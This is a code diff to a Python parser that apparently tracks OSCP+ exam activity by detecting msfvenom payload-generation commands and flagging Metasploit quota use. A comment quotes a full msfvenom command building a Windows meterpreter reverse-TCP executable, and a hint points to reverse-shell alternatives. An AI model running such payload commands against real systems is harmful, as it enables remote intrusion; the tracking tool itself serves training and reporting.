@@ -8738,6 +8738,68 @@ def _multiline_passes(path, report, store):
                                        source=path, line=_ln(_psl_hdr),
                                        meta={"source": "psloggedon"}))
 
+    # iter-303: msfvenom payload generation captured. Critical for
+    # OSCP+ exam compliance tracking - msfvenom counts toward the
+    # one-target Metasploit quota. Emitting per unique payload lets
+    # the operator's report show exactly how many times they used
+    # msfvenom and against which target (via LHOST/LPORT context).
+    #
+    # Real captured invocation shape:
+    #   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5
+    #     LPORT=4444 -f exe -o payload.exe
+    # Success output typically follows with:
+    #   [-] No platform was selected, choosing Msf::Module::Platform...
+    #   Payload size: 510 bytes
+    #   Final size of exe file: 7168 bytes
+    #   Saved as: payload.exe
+    _MSFVENOM = re.compile(
+        r'(?i)\bmsfvenom\b[^\r\n]*?'
+        r'-p\s+(\S{5,80})[^\r\n]*?'
+        r'(?:LHOST=(\S{3,80})[^\r\n]*?)?'
+        r'(?:LPORT=(\d{1,5})[^\r\n]*?)?'
+        r'-f\s+(\S{2,20})'
+        r'(?:[^\r\n]*?-o\s+(\S{2,120}))?')
+    _MSFVENOM_SAVED = re.compile(
+        r'(?im)^Saved\s+as\s*:\s*(\S{2,120})')
+    if not filters.is_doc_file(path):
+        _msf_seen = set()
+        _msf_count = 0
+        for _mv in _MSFVENOM.finditer(text[:65536]):
+            _payload = _mv.group(1)
+            _lhost = _mv.group(2) or "<?>"
+            _lport = _mv.group(3) or "<?>"
+            _fmt = _mv.group(4)
+            _outfile = _mv.group(5) or "<stdout>"
+            _sig = (_payload, _lhost, _lport, _fmt)
+            if _sig in _msf_seen:
+                continue
+            _msf_seen.add(_sig)
+            _msf_count += 1
+            # OSCP+ exam rule: Metasploit (including msfvenom) is limited
+            # to ONE target across the entire exam. Elevate when count >1.
+            _sev = "HIGH" if _msf_count > 1 else "MEDIUM"
+            report.add(_sev, "RECON", path, _ln(_mv),
+                       f"msfvenom payload gen #{_msf_count}: "
+                       f"{_payload} LHOST={_lhost}:{_lport} -f "
+                       f"{_fmt} -o {_outfile}",
+                       hint=(f"OSCP+ EXAM QUOTA: msfvenom counts "
+                             f"toward Metasploit one-target limit"
+                             f"  |  invocation #{_msf_count} on this"
+                             f" file  |  if this is a repeat against"
+                             f" a DIFFERENT target, quota has been "
+                             f"blown - reset attack path with pure "
+                             f"non-msf alternatives (revshells.com, "
+                             f"manual asm shellcode, LOLBAS)"))
+            if store is not None:
+                store.add(Evidence(kind="msfvenom_payload",
+                                   source=path, line=_ln(_mv),
+                                   meta={"payload": _payload,
+                                         "lhost": _lhost,
+                                         "lport": _lport,
+                                         "format": _fmt,
+                                         "outfile": _outfile,
+                                         "count_in_file": _msf_count}))
+
     # iter-279: PowerView `Get-DomainComputer -Unconstrained | fl` output.
     # `TRUSTED_FOR_DELEGATION` in userAccountControl = unconstrained
     # Kerberos delegation. On DCs it's by design (SERVER_TRUST_ACCOUNT)
